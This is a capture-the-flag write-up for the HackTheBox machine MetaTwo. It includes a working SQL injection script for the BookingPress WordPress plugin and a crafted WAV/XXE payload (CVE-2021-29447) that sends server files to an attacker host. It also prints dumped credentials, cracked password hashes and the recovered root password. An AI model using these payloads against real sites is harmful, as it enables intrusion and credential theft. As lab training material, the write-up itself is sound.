---
description: MetaTwo box from HackTheBox write up.
password: e3f52881aea09f3a5a7781f9267610b1
---

# MetaTwo

## Nmap

Let's start with an Nmap scan as usual: 

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 1000 -p- 10.129.232.102
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 00:16 EDT
Nmap scan report for 10.129.232.102
Host is up (0.061s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 28.00 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p21,22,80 10.129.232.102                      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 00:19 EDT
Stats: 0:03:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.76% done; ETC: 00:22 (0:00:00 remaining)
Nmap scan report for 10.129.232.102
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.36 seconds
```

Only 3 ports open, I will start with the port 80 because the rest of them will probably require authentication.

## Port 80

It is redirecting to http://metapress.htb/ so I added it to my `/etc/hosts` file. According to the source code of the page, looks like it is Wordpress 5.6.2 and looking around the articles I found something interesting: http://metapress.htb/events/. This page allows a user to register for an event, the plugin name is something like Bookingpress.

I decided to throw WPScan at it with the plugins detection mode set to aggressive to check for installed plugins:

```bash
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://metapress.htb/ --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://metapress.htb/ [10.129.232.102]
[+] Started: Mon Oct 31 00:33:32 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://metapress.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:35:47 <===============================> (100928 / 100928) 100.00% Time: 00:35:47
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] bookingpress-appointment-booking
 | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/
 | Last Updated: 2022-10-22T14:11:00.000Z
 | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | [!] The version is out of date, the latest version is 1.0.45
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200
 |
 | Version: 1.0.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | Confirmed By: Translation File (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: 'sion: BookingPress Appointment Booking v1.0.10'

[+] feed
 | Location: http://metapress.htb/wp-content/plugins/feed/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/feed/, status: 200
 |
 | The version could not be determined.

[+] leira-roles
 | Location: http://metapress.htb/wp-content/plugins/leira-roles/
 | Latest Version: 1.1.8.0 (up to date)
 | Last Updated: 2022-05-05T05:13:00.000Z
 | Readme: http://metapress.htb/wp-content/plugins/leira-roles/README.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/leira-roles/, status: 200
 |
 | Version: 1.1.8.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/leira-roles/README.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/leira-roles/README.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <======================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Oct 31 01:09:35 2022
[+] Requests Done: 101088
[+] Cached Requests: 43
[+] Data Sent: 30.989 MB
[+] Data Received: 36.31 MB
[+] Memory used: 457.629 MB
[+] Elapsed time: 00:36:02
```

The booking press plugin is vulnerable to SQL injection according to [this article](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357). First, we need a nonce that can be found searching for `bookingpress_front_get_category_services` in the source code of the page where the plugin code is embedded, in my case the nonce is `bf440717c1`. Now we can try the PoC:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=bf440717c1&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 31 Oct 2022 05:14:19 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

It works! I wrote a little Python script to ease the injection process. I tried to enumerate the database a bit but could not found anything interesting, just the registered users and their hashes are worth it:

```python
import requests

url = 'http://metapress.htb/wp-admin/admin-ajax.php'

while True:
    sql = input('Inject SQL: ')
    if(sql == 'exit'):
        break

    data = {
        'action': 'bookingpress_front_get_category_services',
        '_wpnonce': 'bf440717c1',
        'category_id': '33',
        'total_service': f'-7502) UNION ALL SELECT 1,2,3,4,5,6,7,8,({sql})-- -'
    }
    response = requests.post(url, data=data)
    if(response.ok):
        json_response = response.json()
        if(len(json_response)):
            print(json_response[0]['bookingpress_servicedate_created'])
        else:
            print('SQL error!')
```

```
Inject SQL: select group_concat(0x7c, user_login, 0x7c, user_pass, 0x7c) from wp_users
|admin|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|,|manager|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```

Using John and the Rockyou dictionary I got the password for `manager` user: `partylikearockstar`. After login into the Wordpress dashboard, looks like the user has really low privileges. The only thing we can do is to upload media files but should be enough. The Wordpress version is vulnerable to [CVE-2021-29447](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/) so we should be able to exfiltrate files from the server. This is the payload I created following the article, the objective is to get the `/etc/passwd` file:


```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.2:8080/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

```bash
┌──(kali㉿kali)-[~/Documents/HTB/MetaTwo(TODO)/www]
└─$ cat evil.dtd               
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.2:8080/?p=%file;'>" >
```

Uploading the payload with a web server hosting the `evil.dtd`, I got this request to my HTTP server:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/MetaTwo(TODO)/www]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.232.102 - - [31/Oct/2022 13:16:21] "GET /evil.dtd HTTP/1.1" 200 -
10.129.232.102 - - [31/Oct/2022 13:16:21] "GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1" 200 -
```

Decoding the base64 we get the `passwd` file of the machine so we can say that the exploit is working!

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

I did the same thing with the Nginx configuration file `/etc/nginx/nginx.conf` to search for the Wordpress root directory:

```
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 768;
    # multi_accept on;
}

http {

    ##
    # Basic Settings
    ##

    sendfile on;
    tcp_nopush on;
    types_hash_max_size 2048;
    # server_tokens off;

    # server_names_hash_bucket_size 64;
    # server_name_in_redirect off;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    ##
    # SSL Settings
    ##

    ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
    ssl_prefer_server_ciphers on;

    ##
    # Logging Settings
    ##

    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;

    ##
    # Gzip Settings
    ##

    gzip on;

    # gzip_vary on;
    # gzip_proxied any;
    # gzip_comp_level 6;
    # gzip_buffers 16 8k;
    # gzip_http_version 1.1;
    # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

    ##
    # Virtual Host Configs
    ##

    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
}


#mail {
#   # See sample authentication script at:
#   # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
#
#   # auth_http localhost/auth.php;
#   # pop3_capabilities "TOP" "USER";
#   # imap_capabilities "IMAP4rev1" "UIDPLUS";
#
#   server {
#       listen     localhost:110;
#       protocol   pop3;
#       proxy      on;
#   }
#
#   server {
#       listen     localhost:143;
#       protocol   imap;
#       proxy      on;
#   }
#}
```

From the above file, I saw that `/etc/nginx/sites-enabled/default` was propably what I was looking for:

```
server {

    listen 80;
    listen [::]:80;

    root /var/www/metapress.htb/blog;

    index index.php index.html;

        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }

    location / {
        try_files $uri $uri/ /index.php?$args;
    }
    
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
    }

    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
        expires max;
        log_not_found off;
    }

}
```

Now it is easy to find the Wordpress configuration file `/var/www/metapress.htb/blog/wp-config.php`

```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
    define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Some interesting things here, credentials for the database: `blog:635Aq@TdqrCwXFUZ` and credentials for the FTP server: `metapress.htb:9NYS_ii@FyL_p5M2NvJ`. Now we can finally access the FTP server and start preparing a way into the machine.

## Port 21

In the FTP server I can get access to all the Wordpress files but also to a directory called `mailer`. Looks like this is a PHP application that will be used to send messages to all the blog users, the interesting thing here is the file `send_email.php`. I found new credentials for what looks like a email server in port 587: `jnelson@metapress.htb:Cb4_JmWM8zUZWMu@Ys`.

I decided to try the credentials I just found to connect through SSH as the `jnelson` user and it worked! We are in the machine now!

## Inside the machine as `jnelson`

After getting the flag I saw something interesting right away, a directory called `.passpie`. A quick Google search revealed that this folder is part of a password manager called [Passpie](https://github.com/marcwebbie/passpie). According with the `ssh` directory inside, looks like we could get the `root` password from here somehow:

```bash
jnelson@meta2:~/.passpie/ssh$ ls
jnelson.pass  root.pass
```

```bash
jnelson@meta2:~$ passpie 
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
```

### Privilege escalation

Researching the documentation a bit, looks like it is possible to get the password using a master key. I found something interesting:

```bash
jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26 13:57 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26 13:58 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
```

That `.key` file contains both a private and a public PGP keys. Checking how this password manager works, looks like the private key is encrypted using a master password and then the passwords stored are encrypted using the public key. In order to decrypt the stored passwords, the user needs to enter the master password to decrypt the private key that allows the decryption of the information encrypted with the public key.

I copied the private key from the `.keys` file and using `gpg2john` and transfomed it into a hash that JohnTheRipper can understand. I just had to use the RockYou dictionary to get the master password `blink182`:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/MetaTwo(TODO)/passpie]
└─$ john --wordlist=/home/kali/Wordlists/rockyou.txt hash                                             
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:01 DONE (2022-10-31 18:36) 0.5617g/s 94.38p/s 94.38c/s 94.38C/s ginger..987654
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now we can just get the `root` passowrd and get the flag!

```bash
jnelson@meta2:~$ passpie copy root@ssh --to stdout
Passphrase: 
p7qfAZt4_A1xo_0x
```
